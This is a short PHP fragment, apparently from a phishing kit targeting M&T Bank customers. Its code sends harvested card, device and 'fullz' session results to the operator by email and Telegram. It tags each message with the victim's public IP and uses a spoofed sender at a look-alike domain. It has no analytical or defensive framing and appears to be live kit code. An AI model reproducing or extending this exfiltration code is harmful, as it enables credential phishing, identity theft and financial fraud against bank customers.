...
//Email
        if($Send_Email == 1 ){
            $subject = $PublicIP.' 🔋 M&T BANK CARD | DEVICE';$headers = 'From: YoCHI <yochmoneywellsf@wellsfofyoch.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
...
//TELEGRAM 
		...
		if($Send_Email == 1 && isset($_SESSION['fullz'])){
            $subject = $PublicIP.' 🔋 M&T BANK SESSION RESULTS';$headers = 'From: YoCHI <yochmoneywellsf@wellsfofyoch.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
